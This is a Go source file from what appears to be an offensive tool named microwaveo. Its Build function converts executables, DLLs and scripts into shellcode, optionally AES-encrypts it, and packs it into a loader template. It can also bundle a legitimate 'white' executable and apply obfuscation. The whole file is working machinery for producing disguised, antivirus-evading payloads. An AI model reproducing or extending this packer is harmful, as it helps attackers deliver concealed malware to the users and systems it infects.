package cupboard

import (
	"io/ioutil"
	"microwaveo/pkg/file2shellcode"
	"microwaveo/pkg/loader"
	"microwaveo/pkg/logger"
	"microwaveo/pkg/utils"
	"os"
	"path"
	"strings"
)

type Cmdargs struct {
	Input           string
	White           string
	Arch            string
	FuncName        string
	ShellcodeFormat string
	Obfuscate       bool
	Encrypt         string
}

func Build(args *Cmdargs) {
	// 生成shellcode
	var shellcodeOutputpath string
	tv := &loader.TmplValue{}
	fileNameWithSuffix := path.Base(args.Input)
	fileType := path.Ext(fileNameWithSuffix)
	fileNameOnly := strings.TrimSuffix(fileNameWithSuffix, fileType)
	tv.FileName = fileNameOnly
	logger.Printf("We use microwave to heat %s ", fileNameWithSuffix)
	if fileType == ".dll" && args.FuncName == "" {
		logger.Fatal("input is dll, you need to specify -fn")
		os.Exit(-1)
	}
	if fileType == ".exe" || fileType == ".dll" || fileType == ".vbs" || fileType == ".js" || fileType == ".xsl" {
		shellcodeBuffer, err := file2shellcode.Build(args.Input, args.Arch, args.FuncName, args.ShellcodeFormat)
		if err != nil {
			logger.Fatalf("build shellcode error: %s", err.Error())
		}
		shellcodeOutputpath = path.Join(utils.GetCurrentDirectory(), fileNameOnly+"."+args.ShellcodeFormat)
		f, err := os.Create(shellcodeOutputpath)
		if err != nil {
			logger.Fatalf("os create shellcode outpath error: %s,%s", err.Error(), shellcodeOutputpath)
		}
		defer f.Close()
		if _, err = shellcodeBuffer.WriteTo(f); err != nil {
			logger.Fatalf("write shellcode error: %s", err.Error())
		}
		logger.Printf("generated shellcode: %s", shellcodeOutputpath)
	}
	// shellcode 通过加载器生成exe
	if fileType == ".bin" {
		logger.Print("use input shellcode compline")
		shellcodeOutputpath = args.Input
	}
	dstShellcodePath := path.Join(utils.GetCurrentDirectory(), "conf", "template", "static", "tmp.bin")
	// 如果开启了加密 需要对shellcode进行加密
	if args.Encrypt == "aes" {
		// 生成随机key
		key := utils.RandLetters(32)
		tv.AesKey = key
		shellcodeData, err := ioutil.ReadFile(shellcodeOutputpath)
		if err != nil {
			logger.Fatalf("read shellcode bin error: %s", err.Error())
		}
		aesShellcodeData, err := utils.AesEncrypt(shellcodeData, []byte(key))
		if err != nil {
			logger.Fatalf("encrypt shellcode bin error: %s", err.Error())
		}
		ioutil.WriteFile(dstShellcodePath, aesShellcodeData, 0666)

	} else {
		err := utils.CopyFile(shellcodeOutputpath, dstShellcodePath)
		if err != nil {
			logger.Fatalf("copy shellcode bin error: %s", err.Error())
		}
	}
	// 白文件处理
	if args.White != "" {
		dstWhitePath := path.Join(utils.GetCurrentDirectory(), "conf", "template", "static", "white.exe")
		err := utils.CopyFile(args.White, dstWhitePath)
		if err != nil {
			logger.Fatalf("copy white file error: %s", err.Error())
		}
	}
	tv.Encrypt = args.Encrypt
	tv.Obfuscate = args.Obfuscate
	tv.White = args.White
	tv.Arch = args.Arch
	loader.Build(*tv)
}
